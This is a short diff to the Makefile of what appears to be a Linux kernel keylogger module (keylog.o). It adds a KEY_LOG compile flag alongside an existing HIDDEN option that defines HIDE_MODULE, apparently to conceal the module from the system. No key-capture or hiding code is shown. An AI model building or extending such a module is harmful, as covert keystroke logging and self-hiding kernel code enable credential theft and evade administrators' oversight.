@@ -6,8 +6,14 @@ keylog-objs := keylog.o
 KVERSION = $(shell uname -r)
 KDIR := /lib/modules/$(KVERSION)/build
 
+KCPPFLAGS=""
+
+ifdef KEY_LOG
+KCPPFLAGS+="-DKEY_LOG"
+endif
+
 ifdef HIDDEN
-KCPPFLAGS="-DHIDE_MODULE -DBUFLEN=2048"
+KCPPFLAGS+="-DHIDE_MODULE -DBUFLEN=2048"
 endif
 
 all:
